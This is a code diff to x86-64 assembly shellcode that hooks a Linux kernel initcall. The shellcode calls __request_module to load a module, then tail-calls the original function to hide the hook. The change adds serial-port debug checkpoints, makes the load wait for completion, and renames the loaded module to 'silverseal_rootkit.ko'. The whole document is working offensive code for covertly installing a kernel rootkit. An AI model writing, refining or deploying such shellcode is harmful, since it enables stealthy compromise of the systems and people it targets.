@@ -13,9 +13,20 @@
 ;   [request_module_ptr]    8 bytes  <- sentinel 0xDEADBEEFDEADBEEF, patched to __request_module
 ;   [original_fn_ptr]       8 bytes  <- sentinel 0xCAFEBABECAFEBABE, patched to original initcall
 ;   [path_buffer]           256 bytes <- "/silverseal-lkm.ko\0" + zero padding
+;
+; Debug: emits 'S', 'M', 'J' on COM1 (0x3F8) at entry, after __request_module,
+;        and before tail-call respectively.
 
 BITS 64
 default rel
+
+; ── COM1 serial helper macro ─────────────────────────────────────────────────
+; Emits a single ASCII byte on COM1 (port 0x3F8). Clobbers dx and al only.
+%macro SERIAL_CHAR 1
+    mov     dx, 0x3F8
+    mov     al, %1
+    out     dx, al
+%endmacro
 
 ; ── Entry point ──────────────────────────────────────────────────────────────
 ; Calling convention: Linux x86-64 System V ABI
@@ -25,13 +36,19 @@ default rel
 lkm_loader:
     push    rbp                     ; rsp: 8 → 0 (aligned for call below)
 
-    mov     edi, 0                  ; arg1: wait = false
+    SERIAL_CHAR 'S'                 ; checkpoint: Shellcode entry reached
+
+    mov     edi, 1                  ; arg1: wait = true
     lea     rsi, [path_buffer]      ; arg2: fmt = "/silverseal-lkm.ko"
     xor     eax, eax                ; al = 0 (variadic: no vector register args)
-    call    [request_module_ptr]    ; __request_module(0, "/silverseal-lkm.ko")
+    call    [request_module_ptr]    ; __request_module(1, "/silverseal-lkm.ko")
                                     ; return value intentionally discarded
 
+    SERIAL_CHAR 'M'                 ; checkpoint: __request_module returned
+
     pop     rbp
+
+    SERIAL_CHAR 'J'                 ; checkpoint: about to tail-call original
     jmp     [original_fn_ptr]       ; tail-call: original initcall's ret goes
                                     ; straight to the framework; eax propagated
 
@@ -44,5 +61,5 @@ original_fn_ptr:
 
 ; ── Path buffer: 256 bytes total ──────────────────────────────────────────────
 path_buffer:
-    db      "/silverseal-lkm.ko", 0
+    db      "/silverseal_rootkit.ko", 0
     times   (256 - ($ - path_buffer)) db 0
